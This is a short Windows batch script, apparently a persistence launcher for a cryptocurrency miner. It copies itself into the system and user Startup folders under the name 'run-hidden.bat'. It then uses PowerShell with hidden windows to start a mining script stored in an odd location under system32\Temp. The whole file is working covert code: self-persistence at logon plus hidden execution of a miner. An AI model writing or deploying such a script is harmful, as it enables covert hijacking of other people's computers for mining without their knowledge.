@echo off
copy "%~f0" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\run-hidden.bat" 2>nul
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\run-hidden.bat" 2>nul
powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd -ArgumentList '/c C:\WINDOWS\system32\Temp\NexaAhhBullet-main\NEXA\mine_nexa_with_oc.bat' -WindowStyle Hidden"
